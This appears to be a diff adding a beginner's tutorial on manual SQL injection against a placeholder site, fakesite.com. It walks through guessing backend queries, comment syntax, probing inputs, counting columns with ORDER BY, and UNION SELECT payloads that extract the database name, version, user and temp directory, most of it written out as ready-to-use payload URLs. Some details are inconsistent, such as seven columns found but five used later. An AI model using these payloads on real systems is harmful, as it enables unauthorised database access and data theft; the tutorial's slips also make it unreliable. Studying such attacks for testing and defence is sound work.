@@ -1,0 +1,157 @@
+Here is an example of the most basic type of Select query.
+
+> select * from table1
+
+so for example we do not want all the columns but only some selected colulms in output then the query will be.
+
+> select column1,column2 from table1
+
+lets try some other conditions with string type columns.
+
+> select * from students where name='natasha'
+
+NOTE: When ever we are facing a SQL injection. Something query this is running inside the application. So once we assume what the query is we can easily start injecting into it. Following are some common possiblities of queries you can face:
+
+> select * from table_name where id=1
+> select * from table_name where id='1'
+> select * from table_name where id="1"
+> select * from table_name where id=(1)
+> select * from table_name where id=('1')
+> select * from table_name where id=("1")
+
+For Example when we see any url like "http://fakesite.com/report.php?id=23" we can easily assume what query may be working inside. And that is the first step of SQL injection.
+
+So if we assume for the above url our Assumption Queries will be the following:
+
+> select * from table_name where id=23
+> select * from table_name where id='23'
+> select * from table_name where id="23"
+> select * from table_name where id=(23)
+> select * from table_name where id=('23')
+> select * from table_name where id=("23")
+
+Now lets continue to next step how to test with different input and know which of the above query are we dealing with.
+
+- First of all we can try our input with some injections to see if we get any error.
+- Error may always not be real SQL error it may be some times generic error or change in output of the application.
+
+TARGET URL: "http://fakesite.com/report.php?id=23"
+BACKEND QUERY: select * from table_name where id=23
+
+before we start we must know different types of comments used in SQLi.
+````````````````````````````````````
+Comment		Name
+
+
+--		:	MySQL Linux Style
+-- -		:	MySQL Linux Style
+--+		:	MySQL Windows Style
+#		:	Hash (URL encode while use)
+--+-		:	SQL Comment
+;%00		:	Null Byte
+`		:	Backtick
+
+
+
+Input					
+--------------
+http://fakesite.com/report.php?id=23--
+http://fakesite.com/report.php?id=23'				
+http://fakesite.com/report.php?id="					
+http://fakesite.com/report.php?id=23 or 1=1		
+http://fakesite.com/report.php?id=23 and 1=1		
+http://fakesite.com/report.php?id=23 and false	
+http://fakesite.com/report.php?id=23 and true		
+http://fakesite.com/report.php?id=23--+				
+http://fakesite.com/report.php?id=23 and true--+	
+http://fakesite.com/report.php?id=23' and false--+
+
+Reaction if its Int Based Injection:
+`````````````````````````````````````
+It should cause error or no output
+
+Three basic rules of injecting
+
+[1]. Balance.
+[2]. Inject.
+[3]. Commenting.
+
+
+http://fakesite.com/report.php?id=23' order by 10--+
+
+23' 		: Balance
+order by 10 	: Injection
+--+		: Comment
+
+As per the Above Injection we can assume the internal query to be:
+
+> select * from tablename where id='23' order by 1--+'
+
+So now lets start with our next phase, in this phase we will learn why and how to find the number of columns. we will use 'Order By' as we know if we give order by a number more than the number under the query, then it will throw an error.
+
+#1
+URL Injection	: http://fakesite.com/report.php?id=23 order by 10--+
+Internal Query	:  select * from tablename where id=23 order by 10
+Output		: Error (then reduce)
+
+#2
+URL Injection	: http://fakesite.com/report.php?id=23 order by 1--+
+Internal Query	:  select * from tablename where id=23 order by 1--+
+Output			: Working (then increase)
+
+#3
+URL Injection	: http://fakesite.com/report.php?id=23 order by 7--+
+Internal Query	:  select * from tablename where id=23 order by 7
+Output			: Working (then increase)
+
+#3
+URL Injection	: http://fakesite.com/report.php?id=23 order by 8--+
+Internal Query	:  select * from tablename where id=23 order by 8
+Output			: Error (then reduce)
+
+NOTE: We already know that 7 worked so we dont need to reduce and test again. We can simply understand that 7 is the last number that worked. Now we can use Union select query, which will be the next phase of our injection.
+
+
+Now we will use Union select statement over here.
+
+
+http://fakesite.com/report.php?id=23 union select 1,2,3,4,5,6,7--+
+
+
+HACK IT:
+``````
+Variable/Function		Output
+````````````````````````````````
+@@hostname		:	Current Hostname
+@@tmpdir		:	Temp Directory
+@@datadir		:	Data Directory
+@@version		:	Version of DB
+@@basedir		:	Base Directory
+user()			:	Current User
+database()		:	Current Database
+version()		:	Version
+schema()		:	current Database
+UUID()			:	System UUID key
+current_user()		:	Current User
+current_user		:	Current User
+system_user()		:	Current Sustem user
+session_user()		:	Session user
+@@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
+@@GLOBAL.have_ssl	:	Check if it have ssl or not
+
+
+To get the Current Database Name:
+``````````````````````````````
+http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5--+
+
+To get the Current Version:
+````````````````````````
+http://fakesite.com/report.php?id=-23 union select 1,2,version(),4,5--+
+
+To get the Current User:
+``````````````````
+http://fakesite.com/report.php?id=-23 union select 1,2,user(),4,5--+
+
+To get the Temporary Directory Path:
+`````````````````````````````````
+http://fakesite.com/report.php?id=-23 union select 1,2,@@tmpdir,4,5--+
